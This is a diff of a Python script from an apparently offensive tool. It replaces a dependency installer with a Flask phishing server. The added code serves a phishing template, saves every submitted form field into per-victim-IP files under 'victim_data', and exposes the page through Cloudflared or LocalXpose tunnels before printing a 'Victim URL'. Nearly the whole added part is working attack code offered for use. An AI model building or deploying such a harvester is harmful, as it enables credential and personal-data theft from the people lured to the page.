@@ -1,9 +1,11 @@
 import os
 import platform
-import shutil  # Importing shutil to fix the NameError
 import subprocess
-import sys
 import time
+from flask import Flask, request, render_template
+import json
+from datetime import datetime
+import socket
 
 def display_banner():
     print("\033[1;92m")
@@ -20,91 +22,105 @@ def display_banner():
     print("       Developed by Mister-God")
     print("\033[0m")
 
-def install_python_dependencies():
-    print("[*] Installing Python dependencies from requirements.txt...")
-    try:
-        subprocess.run([sys.executable, "-m", "pip", "install", "-r", "requirements.txt"], check=True)
-        print("[*] Python dependencies installed successfully.")
-    except subprocess.CalledProcessError as e:
-        print(f"[!] Failed to install Python dependencies: {e}")
-        exit(1)
+# Flask app
+app = Flask(__name__, template_folder="templates")
 
-def check_and_install_tool(tool_name):
-    print(f"[*] Checking for {tool_name}...")
-    if not shutil.which(tool_name):
-        print(f"[!] {tool_name} is not installed. Please install it manually and try again.")
-        exit(1)
-    else:
-        print(f"[*] {tool_name} is already installed.")
+# Global variables
+victim_data_folder = "victim_data"
 
-def install_cloudflared():
-    print("[*] Installing Cloudflared...")
-    if not os.path.exists(".server"):
-        os.makedirs(".server")
-    arch = platform.machine()
-    os_type = platform.system().lower()
+@app.route("/", methods=["GET", "POST"])
+def phishing_page():
+    victim_ip = request.remote_addr
+    victim_folder = os.path.join(victim_data_folder, victim_ip)
+    os.makedirs(victim_folder, exist_ok=True)
+
+    if request.method == "POST":
+        form_data = request.form.to_dict()
+        form_data["timestamp"] = str(datetime.now())
+        with open(os.path.join(victim_folder, "details.json"), "a") as file:
+            json.dump(form_data, file, indent=4)
+            file.write("\n")
+
+        if "name" not in form_data:
+            return render_template("name_prompt.html")
+        else:
+            return render_template("success.html")
+
+    return render_template("phishing_template.html")
+
+
+def generate_localhost_url(port):
+    return f"http://127.0.0.1:{port}"
+
+
+def start_cloudflared(port):
     cloudflared_path = ".server/cloudflared"
-
-    # Determine the correct Cloudflared binary based on OS and architecture
-    if os_type == "windows":
-        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
+    if platform.system().lower() == "windows":
         cloudflared_path += ".exe"
-    elif os_type == "darwin":
-        if arch == "arm64":
-            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64"
-        else:
-            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64"
-    elif os_type == "linux":
-        if arch == "x86_64":
-            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
-        elif arch in ["i686", "i386"]:
-            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386"
-        elif arch in ["aarch64", "arm64"]:
-            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
-        elif arch in ["armv7l", "armv6l", "arm"]:
-            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
-        else:
-            print("[!] Unsupported architecture. Defaulting to amd64.")
-            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
+
+    process = subprocess.Popen(
+        [cloudflared_path, "tunnel", "--url", f"http://127.0.0.1:{port}"],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        text=True,
+    )
+
+    time.sleep(10)  # Wait for Cloudflared to establish the tunnel
+    output = process.stdout.read()
+    url = None
+    for line in output.splitlines():
+        if "trycloudflare.com" in line:
+            url = line.split(" ")[-1].strip()
+            break
+
+    if url:
+        return url
     else:
-        print("[!] Unsupported operating system.")
-        return
+        process.terminate()
+        raise Exception("Cloudflared failed to generate a URL")
 
-    # Download the binary with retry mechanism
-    retries = 3
-    for attempt in range(1, retries + 1):
-        try:
-            print(f"[*] Attempt {attempt}/{retries}: Downloading Cloudflared...")
-            subprocess.run(["curl", "-s", "-L", "--max-time", "30", "-o", cloudflared_path, url], check=True)
-            os.chmod(cloudflared_path, 0o755)
-            print("[*] Cloudflared installed successfully.")
-            return
-        except subprocess.CalledProcessError as e:
-            print(f"[!] Attempt {attempt} failed: {e}")
-            if attempt < retries:
-                print("[*] Retrying in 5 seconds...")
-                time.sleep(5)
-            else:
-                print("[!] Cloudflared installation failed after multiple attempts. Check your network connection or try manually.")
-                exit(1)
 
-def setup_tool():
-    # Display the banner
-    display_banner()
+def start_localxpose(port):
+    lx_path = ".server/localxpose"
+    process = subprocess.Popen(
+        [lx_path, "http", f"--port={port}"],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        text=True,
+    )
 
-    # Step 1: Install Python dependencies
-    install_python_dependencies()
+    time.sleep(10)  # Wait for LocalXpose to establish the tunnel
+    output = process.stdout.read()
+    url = None
+    for line in output.splitlines():
+        if "loclx.io" in line:
+            url = line.split(" ")[-1].strip()
+            break
 
-    # Step 2: Check and install PHP
-    check_and_install_tool("php")
+    if url:
+        return url
+    else:
+        process.terminate()
+        raise Exception("LocalXpose failed to generate a URL")
 
-    # Step 3: Check and install curl
-    check_and_install_tool("curl")
-
-    # Step 4: Install Cloudflared
-    install_cloudflared()
-
-    print("[*] All dependencies installed and managed successfully. You can now run 'python hatboy.py' to start the tool.")
 
 if __name__ == "__main__":
-    setup_tool()
+    print("Select an option:")
+    print("[01] Localhost")
+    print("[02] Cloudflared")
+    print("[03] LocalXpose")
+    choice = input("Enter your choice: ").strip()
+
+    port = 8080
+    if choice == "01":
+        url = generate_localhost_url(port)
+    elif choice == "02":
+        url = start_cloudflared(port)
+    elif choice == "03":
+        url = start_localxpose(port)
+    else:
+        print("[!] Invalid choice")
+        exit(1)
+
+    print(f"[+] Victim URL: {url}")
+    app.run(host="0.0.0.0", port=port)
